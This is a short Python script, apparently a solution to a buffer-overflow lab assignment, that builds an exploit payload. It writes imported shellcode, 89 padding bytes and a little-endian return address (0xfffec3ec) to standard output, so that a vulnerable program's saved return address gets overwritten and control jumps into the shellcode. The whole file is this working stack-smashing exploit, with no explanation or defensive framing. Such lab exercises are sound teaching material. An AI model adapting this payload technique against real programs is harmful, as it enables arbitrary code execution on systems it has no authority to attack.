#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
little_endian_addr = pack('<I', 0xfffec3ec)
sys.stdout.buffer.write(shellcode + b'\13'*89 + little_endian_addr)

